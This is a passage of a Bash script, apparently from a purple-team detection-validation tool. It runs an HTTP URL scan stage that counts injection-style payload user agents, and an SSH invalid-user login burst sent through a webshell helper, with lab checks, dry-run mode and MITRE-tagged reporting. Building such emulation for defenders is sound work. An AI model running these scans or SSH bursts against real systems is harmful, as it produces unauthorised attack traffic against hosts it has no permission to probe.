            poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
            poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true true \
                "run_http_url_scan_for_target (dry-run)" "0" "0" >/dev/null
        done <<< "${scan_targets}"
        poc_obs_stage_end "HTTP Follow-up"
        simulate_http_scan_response_metrics "${HTTP_FOLLOWUP_PLANNED_REQUESTS}"
        simulate_http_attack_metrics "${HTTP_FOLLOWUP_PLANNED_REQUESTS}"
        HTTP_REQUESTS_ATTEMPTED="${HTTP_FOLLOWUP_PLANNED_REQUESTS}"
        URL_SCAN_UNIQUE_ATTEMPTED="${HTTP_FOLLOWUP_PLANNED_REQUESTS}"
        simulate_url_scan_unique_metrics "${HTTP_FOLLOWUP_PLANNED_REQUESTS}"
        HTTP_FOLLOWUP_CONNECTION_ESTABLISHED="${HTTP_CONNECTED}"
        HTTP_RESPONSES_RECEIVED=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES))
        HTTPS_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED / 3))
        HTTP_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED - HTTPS_RESPONSES_RECEIVED))
        HTTP_CONNECTED="${HTTP_RESPONSES_RECEIVED}"
        HTTPS_CONNECTED="${HTTPS_RESPONSES_RECEIVED}"
        THREAT_HUNT_URL_REQUESTS="${HTTP_REQUESTS_ATTEMPTED}"
        HTTP_PROPFIND_COUNT=$((HTTP_REQUESTS_PLANNED / 8 + 1))
        HTTP_POST_COUNT=$((HTTP_REQUESTS_PLANNED / 6 + 1))
        HTTP_OPTIONS_COUNT=$((HTTP_REQUESTS_PLANNED / 10 + 1))
        sync_web_combined_metrics
        {
            local dr_real dr_synthetic dr_redirect dr_success
            dr_real=$((HTTP_400_COUNT + HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT))
            dr_synthetic=$((URL_SCAN_UNIQUE_FAILED - dr_real))
            (( dr_synthetic < 0 )) && dr_synthetic=0
            dr_redirect=$((HTTP_301_COUNT + HTTP_302_COUNT))
            dr_success="${HTTP_200_COUNT:-0}"
            log_http_url_scan_final_summary "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${HTTP_REQUESTS_PLANNED}" \
                "${dr_success}" "${dr_real}" "${dr_synthetic}" "${dr_redirect}" \
                "${HTTP_400_COUNT:-0}" "${HTTP_401_COUNT:-0}" "${HTTP_403_COUNT:-0}" "${HTTP_404_COUNT:-0}" "${HTTP_405_COUNT:-0}" "0" "0"
            compute_http_ua_detection_likelihoods
            log_http_ua_coverage_aggregate
            log_http_detection_window_bundle "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${HTTP_SCAN_WINDOW_SECONDS}" summary
        }
        compute_web_detection_confidence
        sync_http_followup_counter_aliases
        followup_record_http "${HTTP_REQUESTS_ATTEMPTED}"
        HTTP_URL_SCAN_STAGE_STATUS="success"
        log_message "OK" "$(format_url_scan_stellar_model_block)"
        set_stage_result "HTTP/HTTPS Follow-up" "Success" "dry-run concentrated scan on ${HTTP_URL_SCAN_SELECTED_TARGET:-none}"
        write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "success" "dry-run"
        save_http_url_scan_overlap_result
        return 0
    fi

    local http_total http_idx=0 http_decision precheck_line precheck_cmd precheck_ec precheck_out classification url t0 t1 elapsed
    local aux_p400 aux_p403 aux_p404 aux_psuccess aux_ptimeout
    local main_401=0 main_405=0 main_500=0 main_real_failed=0 main_synthetic_failed=0 main_redirect_count=0
    local http_concentrated_burst_done=false burst_host="" burst_port="" burst_scheme=""

    http_total=$(printf '%s\n' "${scan_targets}" | awk 'NF{c++} END{print c+0}')
    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        pipeline_stop_requested && break
        read -r burst_host burst_port burst_scheme <<< "${target_line}"
        read -r burst_host burst_port burst_scheme <<< "$(normalize_http_scan_target_fields "${burst_host}" "${burst_port}" "${burst_scheme}")"
        http_idx=$((http_idx + 1))
        poc_obs_log "INFO" "HTTP Follow-up Progress: ${http_idx}/${http_total} selected targets processed"
        url="${burst_scheme}://${burst_host}:${burst_port}/"
        precheck_line=$(poc_precheck_http "${url}")
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_http_followup "${classification}"; then
            http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${burst_host}" "${burst_port}" "open" "${burst_scheme}" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "HTTP follow-up skipped ${burst_host}:${burst_port} classification=${classification} decision=${http_decision}"
            continue
        fi
        case "${classification}" in
            http_auth_required) log_http_url_scan_auth_required_continue "${url}" "401" ;;
            http_forbidden|app_forbidden) log_http_url_scan_auth_required_continue "${url}" "403" ;;
            app_unauthorized) log_http_url_scan_auth_required_continue "${url}" "401" ;;
        esac
        log_message "OK" "HTTP follow-up target: host=${burst_host} port=${burst_port} scheme=${burst_scheme} base_url=${url}"
            t0=$(date +%s)
            scan_stats=$(run_http_url_scan_for_target "${burst_host}" "${burst_port}" "${burst_scheme}" | tail -n1)
            t1=$(date +%s)
            elapsed=$((t1 - t0))
            main_burst_elapsed="${elapsed}"
            read -r scheme_out scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success <<< "${scan_stats}"
            sanitize_stats_ints scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success
            main_total="${scan_attempted}"
            main_success="${http_scan_count_200}"
            main_400="${http_scan_count_400}"
            main_401="${http_scan_count_401}"
            main_403="${http_scan_count_403}"
            main_404="${http_scan_count_404}"
            main_405="${http_scan_count_405}"
            main_500="${http_scan_count_500}"
            main_real_failed="${http_scan_real_failed}"
            main_synthetic_failed="${http_scan_synthetic_failed}"
            main_redirect_count="${http_scan_redirect_count}"
            main_timeout="${http_scan_timeout_count}"
            (( main_real_failed == 0 )) && main_real_failed=$((main_400 + main_401 + main_403 + main_404 + main_405 + main_500 + main_timeout))
            (( main_synthetic_failed == 0 && http_scan_count_failed > main_real_failed )) && main_synthetic_failed=$((http_scan_count_failed - main_real_failed))
            (( main_redirect_count == 0 )) && main_redirect_count=$((http_scan_count_301 + http_scan_count_302))
            main_fail_ratio=0
            (( scan_attempted > 0 )) && main_fail_ratio=$((main_real_failed * 100 / scan_attempted))
            unique_attempted_total=$((unique_attempted_total + unique_attempted))
            unique_failed_total=$((unique_failed_total + unique_failed))
            unique_success_total=$((unique_success_total + unique_success))
            attempted_total=$((attempted_total + scan_attempted))
            connected_total=$((connected_total + scan_connected))
            abnormal_total=$((abnormal_total + abnormal_ua))
            rare_total=$((rare_total + rare_ua))
            threat_total=$((threat_total + threat_hunt))
            normal_total=$((normal_total + normal_ua))
            payload_total=$((payload_total + payload_ua))
            sqli_total=$((sqli_total + sqli))
            enc_total=$((enc_total + enc))
            cmd_total=$((cmd_total + cmd))
            trav_total=$((trav_total + trav))
            jndi_total=$((jndi_total + jndi))
            ognl_total=$((ognl_total + ognl))
            spring_total=$((spring_total + spring))
            propfind_total=$((propfind_total + propfind))
            options_total=$((options_total + options))
            post_total=$((post_total + post))
            if [[ "${scheme_out}" == "https" ]]; then
                HTTPS_REQUESTS_ATTEMPTED=$((HTTPS_REQUESTS_ATTEMPTED + scan_attempted))
                HTTPS_RESPONSES_RECEIVED=$((HTTPS_RESPONSES_RECEIVED + scan_responses))
                HTTPS_CONNECTED=$((HTTPS_CONNECTED + scan_connected))
                HTTPS_200_COUNT=$((HTTPS_200_COUNT + http_scan_count_200))
                HTTPS_301_COUNT=$((HTTPS_301_COUNT + http_scan_count_301))
                HTTPS_302_COUNT=$((HTTPS_302_COUNT + http_scan_count_302))
                HTTPS_401_COUNT=$((HTTPS_401_COUNT + http_scan_count_401))
                HTTPS_400_COUNT=$((HTTPS_400_COUNT + http_scan_count_400))
                HTTPS_403_COUNT=$((HTTPS_403_COUNT + http_scan_count_403))
                HTTPS_404_COUNT=$((HTTPS_404_COUNT + http_scan_count_404))
                HTTPS_405_COUNT=$((HTTPS_405_COUNT + http_scan_count_405))
                HTTPS_SCAN_FAILED_RESPONSES=$((HTTPS_SCAN_FAILED_RESPONSES + http_scan_count_failed))
                HTTPS_SCAN_SUCCESS_RESPONSES=$((HTTPS_SCAN_SUCCESS_RESPONSES + http_scan_count_success))
            else
                HTTP_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED + scan_responses))
                HTTP_200_COUNT=$((HTTP_200_COUNT + http_scan_count_200))
                HTTP_301_COUNT=$((HTTP_301_COUNT + http_scan_count_301))
                HTTP_302_COUNT=$((HTTP_302_COUNT + http_scan_count_302))
                HTTP_401_COUNT=$((HTTP_401_COUNT + http_scan_count_401))
                HTTP_400_COUNT=$((HTTP_400_COUNT + http_scan_count_400))
                HTTP_403_COUNT=$((HTTP_403_COUNT + http_scan_count_403))
                HTTP_404_COUNT=$((HTTP_404_COUNT + http_scan_count_404))
                HTTP_405_COUNT=$((HTTP_405_COUNT + http_scan_count_405))
                HTTP_SCAN_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES + http_scan_count_failed))
                HTTP_SCAN_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES + http_scan_count_success))
            fi
            http_scan_count_timeout="${main_timeout}"
            http_scan_fail_ratio="${main_fail_ratio}"
            state_append "followup_http_capture.log" "host=${burst_host} port=${burst_port} scheme=${scheme_out} mode=main_burst concentrated=1 attempted=${scan_attempted} unique_attempted=${unique_attempted} unique_failed=${unique_failed} unique_success=${unique_success} responses=${scan_responses} real_failed=${main_real_failed} synthetic_failed=${main_synthetic_failed} redirect_count=${main_redirect_count} http_200=${http_scan_count_200} http_400=${http_scan_count_400} http_403=${http_scan_count_403} http_404=${http_scan_count_404} http_405=${http_scan_count_405} http_500=${http_scan_count_500} timeout=${main_timeout} propfind=${propfind} post=${post} options=${options}"
            safe_poc_accumulate_http_scan_status_counts "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" "${http_scan_count_failed}" "${http_scan_count_success}" "${scan_attempted}" "${scan_responses}"
            log_http_url_scan_target_summary "${scheme_out}://${burst_host}:${burst_port}" "${scan_attempted}" "${scan_responses}" \
                "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_400}" "${http_scan_count_401}" \
                "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" "${http_scan_count_500}" "${main_timeout}" \
                "${main_real_failed}" "${http_scan_count_success}" "${http_scan_fail_ratio}" || true
            local http_attempt_ok=false
            poc_http_followup_attempt_ok "${scan_responses}" "${scan_connected}" "${http_scan_count_success}" "${scan_attempted}" && http_attempt_ok=true
            http_decision=$(poc_obs_record_followup "HTTP URL Scan" "${burst_host}" "${burst_port}" "open" "${scheme_out}" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
                "${http_attempt_ok}" "run_http_url_scan_for_target ${burst_scheme}://${burst_host}:${burst_port}" "${WEBSHELL_LAST_EXIT_CODE:-0}" "${elapsed}")
            poc_obs_log "EVIDENCE" "HTTP follow-up ${burst_host}:${burst_port} decision=${http_decision} responses=${scan_responses} mode=detection_followup"
            if (( scan_attempted > 0 && scan_responses == 0 )); then
                log_message "WARN" "HTTP follow-up produced no responses for ${burst_host}:${burst_port} — slim retry once"
                scan_stats=$(run_http_url_scan_for_target "${burst_host}" "${burst_port}" "${burst_scheme}" slim_retry | tail -n1)
                read -r scheme_out scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                    http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                    http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                    propfind options post unique_attempted unique_failed unique_success <<< "${scan_stats}" 2>/dev/null || true
            fi
            http_concentrated_burst_done=true
    done <<< "${scan_targets}"
    poc_obs_stage_end "HTTP Follow-up"

    HTTP_REQUESTS_ATTEMPTED="${attempted_total}"
    URL_SCAN_UNIQUE_ATTEMPTED="${unique_attempted_total}"
    HTTP_FOLLOWUP_CONNECTION_ESTABLISHED="${connected_total}"
    HTTP_CONNECTED="${connected_total}"
    ABNORMAL_USER_AGENT_COUNT="${abnormal_total}"
    RARE_USER_AGENT_COUNT="${rare_total}"
    NORMAL_USER_AGENT_COUNT="${normal_total}"
    PAYLOAD_USER_AGENT_COUNT="${payload_total}"
    UA_SQLI_STYLE_COUNT="${sqli_total}"
    UA_ENCODING_ABUSE_COUNT="${enc_total}"
    UA_COMMAND_STYLE_COUNT="${cmd_total}"
    UA_TRAVERSAL_STYLE_COUNT="${trav_total}"
    UA_JNDI_STYLE_COUNT="${jndi_total}"
    UA_OGNL_STYLE_COUNT="${ognl_total}"
    UA_SPRING_STYLE_COUNT="${spring_total}"
    THREAT_HUNT_URL_REQUESTS="${threat_total}"
    HTTP_PROPFIND_COUNT="${propfind_total}"
    HTTP_OPTIONS_COUNT="${options_total}"
    HTTP_POST_COUNT="${post_total}"
    URL_SCAN_UNIQUE_ATTEMPTED="${unique_attempted_total}"
    URL_SCAN_UNIQUE_FAILED="${unique_failed_total}"
    URL_SCAN_UNIQUE_SUCCESS="${unique_success_total}"
    sync_url_scan_unique_metrics
    reconcile_http_scan_status_metrics
    sync_http_scan_fail_ratio
    http_url_scan_reconcile_telemetry_counters
    sync_web_combined_metrics
    http_refresh_sot_from_events || true
    if (( $(safe_int "${HTTP_URL_ATTEMPT_COUNT:-0}") > 0 )); then
        HTTP_REQUESTS_ATTEMPTED="${HTTP_URL_ATTEMPT_COUNT}"
        URL_SCAN_UNIQUE_ATTEMPTED="${HTTP_URL_COMPLETE_COUNT}"
    fi

    local http_decision_result="" http_decision_reason="" http_4xx_total=0
    local telemetry_responses acct_real_failed acct_timeouts
    http_4xx_total=$((main_400 + main_401 + main_403 + main_404 + main_405 + main_500 + HTTPS_400_COUNT + HTTPS_401_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    telemetry_responses=$(safe_int "${HTTP_URL_COMPLETE_COUNT:-$(http_url_scan_telemetry_responses)}")
    acct_real_failed=$(safe_int "${HTTP_URL_SCAN_REAL_FAILED:-0}")
    (( acct_real_failed < 1 )) && acct_real_failed=$(http_url_scan_sum_failed_status_codes)
    (( acct_real_failed < 1 )) && acct_real_failed=$(safe_int "${main_real_failed:-0}")
    acct_timeouts=$(safe_int "${HTTP_URL_SCAN_TIMEOUT_COUNT:-${main_timeout:-0}}")
    if ! http_url_scan_validate_counters_fail_fast "${HTTP_REQUESTS_ATTEMPTED:-0}" "${telemetry_responses}" "${acct_real_failed}" "${acct_timeouts}"; then
        http_stage_status="Failed"
        http_stage_detail="HTTP_URL_SCAN counter validation failed (see HTTP_COUNTER_BUG_FAIL_FAST / HTTP_URL_SCAN_BUG_FAIL_FAST)"
        log_message "ERROR" "${http_stage_detail}"
    fi
    log_message "OK" "HTTP_URL_SCAN_REQUEST_COUNTER planned=${HTTP_REQUESTS_PLANNED:-0} attempted=${HTTP_REQUESTS_ATTEMPTED:-0} responses=${telemetry_responses} real_failed=${acct_real_failed} timeouts=${acct_timeouts}"
    http_emit_url_execution_summary
    read -r http_decision_result http_decision_reason <<< "$(http_url_scan_decision_evaluate "${HTTP_REQUESTS_ATTEMPTED:-0}" "${telemetry_responses}" "${acct_real_failed}" "${acct_timeouts}" "${URL_SCAN_UNIQUE_ATTEMPTED:-${HTTP_REQUESTS_ATTEMPTED:-0}}" "${http_4xx_total}")"
    (( main_real_failed < 1 && acct_real_failed > 0 )) && main_real_failed="${acct_real_failed}"
    (( main_400 < 1 )) && main_400=$((HTTP_400_COUNT + HTTPS_400_COUNT))
    (( main_401 < 1 )) && main_401=$((HTTP_401_COUNT + HTTPS_401_COUNT))
    (( main_403 < 1 )) && main_403=$((HTTP_403_COUNT + HTTPS_403_COUNT))
    (( main_404 < 1 )) && main_404=$((HTTP_404_COUNT + HTTPS_404_COUNT))
    (( main_405 < 1 )) && main_405=$((HTTP_405_COUNT + HTTPS_405_COUNT))
    (( main_500 < 1 )) && main_500=$((HTTP_500_COUNT + 0))
    if (( main_total > 0 )); then
        log_http_url_scan_final_summary "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${main_total}" \
            "${main_success}" "${main_real_failed}" "${main_synthetic_failed}" "${main_redirect_count}" \
            "${main_400}" "${main_401}" "${main_403}" "${main_404}" "${main_405}" "${main_500}" "${main_timeout}"
    elif (( HTTP_REQUESTS_ATTEMPTED > 0 )); then
        log_http_url_scan_final_summary "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${HTTP_REQUESTS_ATTEMPTED}" \
            "${main_success}" "${main_real_failed}" "${main_synthetic_failed}" "${main_redirect_count}" \
            "${main_400}" "${main_401}" "${main_403}" "${main_404}" "${main_405}" "${main_500}" "${main_timeout}"
    fi
    compute_http_ua_detection_likelihoods
    log_http_ua_coverage_aggregate
    if (( main_total > 0 )); then
        log_http_detection_window_bundle "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${main_burst_elapsed:-${HTTP_SCAN_WINDOW_SECONDS}}" summary
    fi
    compute_web_detection_confidence
    sync_http_followup_counter_aliases
    followup_record_http "${attempted_total}"

    check_http_ua_coverage_warn
    poc_obs_log "SUMMARY" "HTTP URL Scan stage finished — planned=${HTTP_REQUESTS_PLANNED} attempted=${HTTP_REQUESTS_ATTEMPTED} unique_attempted=${URL_SCAN_UNIQUE_ATTEMPTED} unique_failed=${URL_SCAN_UNIQUE_FAILED} web_responses=${WEB_RESPONSES_RECEIVED} confidence=${WEB_DETECTION_CONFIDENCE} detection_likelihood_url_scan=${DETECTION_LIKELIHOOD_URL_SCAN:-low} detection_likelihood_malicious_ua=${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low} ua_coverage=${HTTP_UA_STAGE_COVERAGE_PRESENT:-${HTTP_UA_COVERAGE_PRESENT:-0}}/${HTTP_UA_STAGE_COVERAGE_TOTAL:-${HTTP_UA_COVERAGE_TOTAL:-0}}"
    poc_obs_log "EVIDENCE" "$(format_http_status_breakdown_block | tr '\n' ' ')"
    poc_obs_log "EVIDENCE" "$(format_http_method_breakdown_block | tr '\n' ' ')"
    poc_obs_log "EVIDENCE" "$(format_http_attack_summary_block | tr '\n' ' ')"
    log_message "OK" "$(format_url_scan_stellar_model_block)"
    log_message "OK" "$(format_http_attack_summary_block)"

    if (( HTTP_REQUESTS_ATTEMPTED == 0 )); then
        http_stage_status="Failed"
        HTTP_URL_SCAN_STAGE_STATUS="failed"
        http_stage_detail="URL-SCAN EXECUTION FAILURE — selected_targets=${HTTP_SCAN_TARGET_COUNT} attempted=0"
        log_message "ERROR" "${http_stage_detail}"
        http_decision_result=failed
        http_decision_reason=insufficient_requests
    elif [[ "${http_decision_result}" == failed ]]; then
        http_stage_status="Failed"
        HTTP_URL_SCAN_STAGE_STATUS="failed"
        if (( WEB_RESPONSES_RECEIVED == 0 )); then
            http_stage_detail="URL-SCAN RESPONSE FAILURE — no web responses received (${http_decision_reason})"
        else
            http_stage_detail="URL-SCAN TELEMETRY FAILURE — ${http_decision_reason} attempted=${HTTP_REQUESTS_ATTEMPTED} responses=${WEB_RESPONSES_RECEIVED}"
        fi
        log_message "ERROR" "${http_stage_detail}"
    elif [[ "${http_decision_result}" == partial ]]; then
        http_stage_status="Partial"
        HTTP_URL_SCAN_STAGE_STATUS="warn"
        http_stage_detail="URL-SCAN partial telemetry (${http_decision_reason}) attempted=${HTTP_REQUESTS_ATTEMPTED} responses=${WEB_RESPONSES_RECEIVED}"
        log_message "WARN" "${http_stage_detail}"
    elif [[ "${http_decision_result}" == success ]] || web_url_scan_successful; then
        HTTP_URL_SCAN_STAGE_STATUS="success"
        http_stage_status="Success"
        http_stage_detail="targets=1 selected=${HTTP_URL_SCAN_SELECTED_TARGET:-none} web_responses=${WEB_RESPONSES_RECEIVED} confidence=${WEB_DETECTION_CONFIDENCE} detection_likelihood=${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    else
        http_stage_status="Failed"
        HTTP_URL_SCAN_STAGE_STATUS="failed"
        http_stage_detail="URL-SCAN validation failed attempted=${HTTP_REQUESTS_ATTEMPTED} responses=${WEB_RESPONSES_RECEIVED}"
        log_message "ERROR" "${http_stage_detail}"
    fi
    log_detection_quality "HTTP URL Scan" "${HTTP_REQUESTS_ATTEMPTED:-0}" "${main_burst_elapsed:-${HTTP_SCAN_WINDOW_SECONDS:-0}}" \
        "${HTTP_URL_SCAN_SELECTED_TARGET:-1}" "${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}" \
        "${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}" "${HTTP_URL_SCAN_FINAL_REASON:-burst_complete}"
    compute_detection_score_http_url_scan "${HTTP_REQUESTS_ATTEMPTED:-0}" "${HTTP_URL_SCAN_REAL_FAILED:-0}" "1" "${main_burst_elapsed:-${HTTP_SCAN_WINDOW_SECONDS:-0}}"
    set_stage_result "HTTP/HTTPS Follow-up" "${http_stage_status}" "${http_stage_detail}"
    write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "$([[ "${http_stage_status}" == Success ]] && printf success || printf partial)" \
        "web_responses=${WEB_RESPONSES_RECEIVED} confidence=${WEB_DETECTION_CONFIDENCE}"
    save_http_url_scan_overlap_result
    if [[ "${http_stage_status}" == "Failed" ]]; then
        return 1
    fi
    return 0
}

stage_ssh_auth_burst() {
    local targets attempts concurrency minutes planned executed=0 observed_total=0 host_count
    local target n ssh_idx=0 ssh_total precheck_line precheck_cmd precheck_ec precheck_out classification ssh_decision t0 t1 elapsed

    poc_obs_stage_start "SSH Follow-up"
    targets=$(collect_ssh_burst_targets)
    if [[ -z "${targets}" ]]; then
        poc_obs_record_followup "SSH Login Simulation" "n/a" "22" "not_found" "ssh" "n/a" "0" "no SSH targets" \
            "config_missing" false false "" "0" "0" || true
        add_skipped_stage "SSH Auth Burst" "No SSH targets (discovery empty and no --ssh-target)"
        set_stage_result "SSH Auth Burst" "Skipped" "no SSH targets (decision=skipped_config_missing)"
        poc_obs_stage_end "SSH Follow-up"
        return 0
    fi

    SSH_AUTH_BURST_ENABLED=true
    attempts="${SSH_BURST_ATTEMPTS}"
    concurrency="${SSH_BURST_CONCURRENCY}"
    minutes="${SSH_BURST_MINUTES}"
    host_count=$(count_hosts_blob "${targets}")
    planned=$((host_count * attempts))
    SSH_ATTEMPTS_PLANNED="${planned}"
    SSH_AUTH_ATTEMPTED="${planned}"

    log_message "OK" "SSH auth burst: ${host_count} target(s), ${attempts} invalid-user attempts/host (from webshell host)"
    add_executed_stage "SSH Auth Burst"
    write_report_entries "ssh_auth_burst" "T1110.001" "EDR/SIEM" "SSH Auth Failure Burst" "multi" "start" "invalid-user auth telemetry (no credentials)"

    ssh_total=$(count_hosts_blob "${targets}")
    if [[ "${DRY_RUN}" == true ]]; then
        while IFS= read -r target; do
            [[ -z "${target}" ]] && continue
            ssh_idx=$((ssh_idx + 1))
            poc_obs_log "INFO" "SSH Follow-up Progress: ${ssh_idx}/${ssh_total} targets processed"
            precheck_line=$(poc_precheck_ssh "${target}" 22)
            poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
            poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true true \
                "ssh invalid-user auth burst (dry-run)" "0" "0" >/dev/null
        done <<< "${targets}"
        SSH_ATTEMPTS_EXECUTED="${planned}"
        SSH_AUTH_FAILURES_OBSERVED="${planned}"
        followup_record_ssh "${planned}"
        poc_obs_stage_end "SSH Follow-up"
        set_stage_result "SSH Auth Burst" "Success" "dry-run planned ${planned} attempts"
        return 0
    fi

    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        pipeline_stop_requested && break
        validate_ssh_target_in_lab "${target}" "SSH burst target" false || continue
        ssh_idx=$((ssh_idx + 1))
        poc_obs_log "INFO" "SSH Follow-up Progress: ${ssh_idx}/${ssh_total} targets processed"
        precheck_line=$(poc_precheck_ssh "${target}" 22)
        poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
        if ! poc_obs_should_run_followup "${classification}"; then
            ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
                "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" false false "" "${precheck_ec}" "0")
            log_message "WARN" "SSH auth burst skipped for ${target}:22 decision=${ssh_decision}"
            continue
        fi
        local ssh_out="" ssh_attempt_ok=false
        t0=$(date +%s)
        if [[ "${minutes}" =~ ^[0-9]+$ && "${minutes}" -gt 0 ]]; then
            ssh_out=$(run_webshell_long "ssh-auth-burst-duration-${target}" \
                "end=\$((\$(date +%s) + ${minutes} * 60)); n=0; while [[ \$(date +%s) -lt \$end ]]; do ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o NumberOfPasswordPrompts=0 invaliduser@${target} exit </dev/null 2>&1 || true; echo SSH_BURST_ATTEMPT; n=\$((n+1)); sleep 1; done; echo SSH_BURST_DONE n=\$n" \
                2>/dev/null || true)
            n=$(printf '%s' "${ssh_out}" | grep -c 'SSH_BURST_ATTEMPT' 2>/dev/null || true)
            n=$(safe_int "${n}")
            sed -n 's/.*n=\([0-9][0-9]*\).*/\1/p' <<< "${ssh_out}" | tail -n1 | grep -qE '^[0-9]+$' && n=$(safe_int "$(sed -n 's/.*n=\([0-9][0-9]*\).*/\1/p' <<< "${ssh_out}" | tail -n1)")
            (( n < 1 )) && n=$((minutes * 30))
            log_ssh_burst_attempts_from_output "${target}" "${ssh_out}"
            executed=$((executed + n))
            observed_total=$((observed_total + n))
        else
            ssh_out=$(run_webshell_long "ssh-auth-burst-${target}" \
                "for i in \$(seq 1 ${attempts}); do ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes -o PasswordAuthentication=no -o IdentitiesOnly=yes -o IdentityFile=/dev/null invaliduser@${target} exit </dev/null 2>&1 || true; echo SSH_BURST_ATTEMPT; done; echo SSH_BURST_DONE" \
                2>/dev/null || true)
            n=$(printf '%s' "${ssh_out}" | grep -c 'SSH_BURST_ATTEMPT' 2>/dev/null || true)
            n=$(safe_int "${n}")
            (( n < 1 )) && n="${attempts}"
            log_ssh_burst_attempts_from_output "${target}" "${ssh_out}"
            executed=$((executed + n))
            observed_total=$((observed_total + n))
            state_append "ssh_auth_telemetry.log" "target=${target} attempted=${n}"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        poc_ssh_followup_attempt_ok "${classification}" "${n}" "${ssh_out}" && ssh_attempt_ok=true
        ssh_decision=$(poc_obs_record_followup "SSH Login Simulation" "${target}" "22" "open" "ssh" \
            "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true \
            "${ssh_attempt_ok}" "ssh invalid-user auth burst" "0" "${elapsed}")
        poc_obs_log "EVIDENCE" "SSH follow-up ${target}:22 decision=${ssh_decision} attempts=${n}"
    done <<< "${targets}"

    SSH_ATTEMPTS_EXECUTED="${executed}"
    if (( observed_total > 0 )); then
        SSH_AUTH_FAILURES_OBSERVED="${observed_total}"
    else
        SSH_AUTH_FAILURES_OBSERVED="${executed}"
    fi
    followup_record_ssh "${executed}"
    poc_obs_log "SUMMARY" "SSH auth burst stage finished — planned=${planned} executed~${executed} observed~${SSH_AUTH_FAILURES_OBSERVED}"
    poc_obs_stage_end "SSH Follow-up"
    log_detection_quality "SSH Auth Burst" "${SSH_ATTEMPTS_EXECUTED:-0}" "${elapsed:-0}" "${host_count:-1}" \
        "ssh_auth_failure_burst" "$([[ "${SSH_ATTEMPTS_EXECUTED:-0}" -ge 30 ]] && printf high || printf medium)" \
        "${SSH_ATTEMPTS_EXECUTED:-0} invalid-user auth attempts across ${host_count:-1} SSH target(s)"
    set_stage_result "SSH Auth Burst" "Success" "planned=${planned} attempted=${SSH_AUTH_ATTEMPTED} executed~${executed} observed~${SSH_AUTH_FAILURES_OBSERVED}"
